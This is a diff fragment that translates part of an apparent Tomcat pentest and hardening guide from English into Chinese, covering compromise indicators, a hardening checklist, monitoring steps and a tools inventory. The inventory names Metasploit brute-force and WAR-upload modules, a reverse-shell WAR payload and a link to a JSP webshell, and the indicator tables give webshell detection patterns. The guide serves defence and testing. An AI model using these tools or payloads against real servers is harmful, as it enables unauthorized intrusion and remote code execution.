-| New `.war` files in `webapps/` not matching deployment timeline | Unauthorized application deployment |
-| Auto-extracted web application directories in `webapps/` (e.g., `/backup/`, `/monshell/`) | WAR deployment artifacts |
-| `.jsp` files containing `Runtime.getRuntime().exec()` | JSP webshell |
-| Unauthorized entries in `tomcat-users.xml` (`manager-gui` or `manager-script` roles) | Persistent backdoor account |
-| `$CATALINA_HOME/webapps/` writable by non-Tomcat users | Filesystem permission weakness |
+| 指标 | 意义 |
+|------|------|
+| `webapps/` 中出现与部署时间线不符的新 `.war` 文件 | 未授权应用部署 |
+| `webapps/` 中自动解压的 Web 应用目录（如 `/backup/`、`/monshell/`） | WAR 部署痕迹 |
+| `.jsp` 文件包含 `Runtime.getRuntime().exec()` | JSP webshell |
+| `tomcat-users.xml` 中未授权的条目（`manager-gui` 或 `manager-script` 角色） | 持久化后门账户 |
+| 非 Tomcat 用户可写 `$CATALINA_HOME/webapps/` | 文件系统权限弱点 |
 
-## 6.2 Hardening Checklist
+## 6.2 加固检查表
 
-### 6.2.1 Configuration Hardening
+### 6.2.1 配置加固
 
-| Action | Rationale |
-|--------|-----------|
-| Remove `/examples`, `/docs`, `/host-manager` in production | Eliminates information disclosure endpoints |
-| Delete default `tomcat-users.xml` and create from scratch | Removes default credential assumptions |
-| Restrict `/manager` access by IP via `RemoteAddrValve` in `context.xml` | Limits manager access to trusted networks |
-| Set `<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127.0.0.1, 192.168.1.0/24"/>` | IP whitelisting for manager |
-| Use strong, unique passwords for all `tomcat-users.xml` entries | Prevents credential brute force |
-| Assign only the minimum required role to each user (`manager-script` over `manager-gui`) | Principle of least privilege |
-| Disable AJP connector (`server.xml`) if not needed | Mitigates AJP-based attacks (Ghostcat) |
-| Bind AJP to `127.0.0.1` only if reverse proxy is on same host | Limits AJP exposure |
-| Run Tomcat as unprivileged OS user (not root) | Limits impact of RCE |
-| Set `<Server port="-1" ...>` to disable shutdown port (8005) | Prevents shutdown command abuse |
-| Remove default `ROOT` webapp or replace with custom landing page | Reduces information leakage |
+| 措施 | 理由 |
+|------|------|
+| 生产环境移除 `/examples`、`/docs`、`/host-manager` | 消除信息泄露端点 |
+| 删除默认 `tomcat-users.xml` 并从头创建 | 消除默认凭据假设 |
+| 通过 `context.xml` 中的 `RemoteAddrValve` 按 IP 限制 `/manager` 访问 | 将 Manager 访问限制在可信网络 |
+| 设置 `<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127.0.0.1, 192.168.1.0/24"/>` | Manager 的 IP 白名单 |
+| 为所有 `tomcat-users.xml` 条目使用强唯一密码 | 防止凭据爆破 |
+| 为每个用户仅分配所需的最低角色（优先 `manager-script` 而非 `manager-gui`） | 最小权限原则 |
+| 如不需要，在 `server.xml` 中禁用 AJP Connector | 缓解基于 AJP 的攻击（Ghostcat） |
+| 仅当反向代理在同一主机时将 AJP 绑定到 `127.0.0.1` | 限制 AJP 暴露面 |
+| 以非特权操作系统用户（非 root）运行 Tomcat | 限制 RCE 影响范围 |
+| 设置 `<Server port="-1" ...>` 禁用 shutdown 端口（8005） | 防止 shutdown 命令滥用 |
+| 移除默认 `ROOT` Web 应用或替换为自定义着陆页 | 减少信息泄露 |
 
-### 6.2.2 Monitoring & Response
+### 6.2.2 监控与响应
 
-| Action | Rationale |
-|---------|-----------|
-| Enable Tomcat Access Log Valve with full request URI and response code | Visibility into exploitation attempts |
-| Monitor `catalina.out` for `RuntimeException` in `/manager` context | Detect exploit failures/successes |
-| Alert on new WAR deployment events (JMX notification or log parsing) | Real-time deployment detection |
-| Run periodic `find $CATALINA_HOME/webapps -name "*.jsp" -newer <baseline>` | Detect new webshell files |
-| Keep Tomcat updated (subscribe to `announce@tomcat.apache.org`) | Address CVEs promptly |
+| 措施 | 理由 |
+|------|------|
+| 启用 Tomcat Access Log Valve，记录完整请求 URI 和响应状态码 | 对利用尝试的可见性 |
+| 监控 `catalina.out` 中 `/manager` 上下文的 `RuntimeException` | 检测利用失败/成功 |
+| 对新的 WAR 部署事件设置告警（JMX 通知或日志解析） | 实时部署检测 |
+| 定期运行 `find $CATALINA_HOME/webapps -name "*.jsp" -newer <baseline>` | 检测新 webshell 文件 |
+| 保持 Tomcat 更新（订阅 `announce@tomcat.apache.org`） | 及时处理 CVE |
 
-## 6.3 Tools Inventory
+## 6.3 工具清单
 
-| Tool | Purpose | Reference |
-|------|---------|-----------|
-| `tomcat_mgr_login` (MSF) | Credential brute force | `auxiliary/scanner/http/tomcat_mgr_login` |
-| `tomcat_enum` (MSF) | Username enumeration (Tomcat <6) | `auxiliary/scanner/http/tomcat_enum` |
-| `tomcat_mgr_upload` (MSF) | Automated WAR deployment + RCE | `exploit/multi/http/tomcat_mgr_upload` |
-| `tomcatWarDeployer.py` | Python WAR deployer with rev/bind shell payloads | [github.com/mgeeky/tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) |
-| `clusterd` | Multi-app-server exploitation framework | [github.com/hatRiot/clusterd](https://github.com/hatRiot/clusterd) |
-| `ApacheTomcatScanner` | Tomcat-specific vulnerability scanner | [github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) |
-| `hydra` | Generic HTTP brute force | Built-in |
-| `msfvenom` | WAR payload generation (`java/jsp_shell_reverse_tcp`) | Built-in |
+| 工具 | 用途 | 参考 |
+|------|------|------|
+| `tomcat_mgr_login`（MSF） | 凭据爆破 | `auxiliary/scanner/http/tomcat_mgr_login` |
+| `tomcat_enum`（MSF） | 用户名枚举（Tomcat <6） | `auxiliary/scanner/http/tomcat_enum` |
+| `tomcat_mgr_upload`（MSF） | 自动化 WAR 部署 + RCE | `exploit/multi/http/tomcat_mgr_upload` |
+| `tomcatWarDeployer.py` | Python WAR 部署器（含反向/绑定 Shell） | [github.com/mgeeky/tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) |
+| `clusterd` | 多应用服务器利用框架 | [github.com/hatRiot/clusterd](https://github.com/hatRiot/clusterd) |
+| `ApacheTomcatScanner` | Tomcat 专用漏洞扫描器 | [github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) |
+| `hydra` | 通用 HTTP 爆破 | 内置 |
+| `msfvenom` | WAR payload 生成（`java/jsp_shell_reverse_tcp`） | 内置 |
 
 ## 参考资料
 
@@ -534,6 +534,6 @@ Common locations:
 - [mgeeky — tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)
 - [hatRiot — clusterd](https://github.com/hatRiot/clusterd)
 - [p0dalirius — ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)
-- [tennc — JSP Webshell (fuzzdb)](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
-- [Pentest-Tomcat (Reference Guide)](https://github.com/simran-sankhala/Pentest-Tomcat)
-- [Tomcat Security Considerations (Official)](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
+- [tennc — JSP Webshell（fuzzdb）](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
+- [Pentest-Tomcat（参考指南）](https://github.com/simran-sankhala/Pentest-Tomcat)
+- [Tomcat 官方安全注意事项](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
